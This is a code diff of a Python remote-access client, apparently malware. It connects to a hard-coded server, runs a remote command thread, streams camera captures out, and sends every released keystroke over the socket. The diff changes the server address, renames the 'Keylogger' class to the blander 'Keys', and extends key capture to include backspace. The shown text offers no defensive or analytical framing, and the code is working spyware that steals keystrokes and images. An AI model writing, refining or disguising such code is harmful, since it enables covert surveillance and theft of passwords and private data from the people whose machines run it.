@@ -1,6 +1,6 @@
 import socket, cv2, threading, keyboard
 
-SERVER_HOST, SERVER_PORT, BUFFER_SIZE = "192.168.0.8", 4000, 1024 * 128
+SERVER_HOST, SERVER_PORT, BUFFER_SIZE = "172.20.10.3", 4000, 1024 * 128
 s = socket.socket(); s.connect((SERVER_HOST, SERVER_PORT))
 
 class Command:
@@ -19,10 +19,10 @@ class Screenshot:
             s.recv(1024); s.sendall(enc)
         cap.release(); cv2.destroyAllWindows()
 
-class Keylogger:
+class Keys:
     def start(self):
-        keyboard.on_release(lambda e: s.sendall((e.name if len(e.name) == 1 else ' ').encode()))
+        keyboard.on_release(lambda e: s.sendall((e.name if len(e.name) == 1 or e.name == "backspace" else ' ').encode()))
         keyboard.wait()
 
 threading.Thread(target=Command().execute).start()
-threading.Thread(target=Keylogger().start).start()
+threading.Thread(target=Keys().start).start()
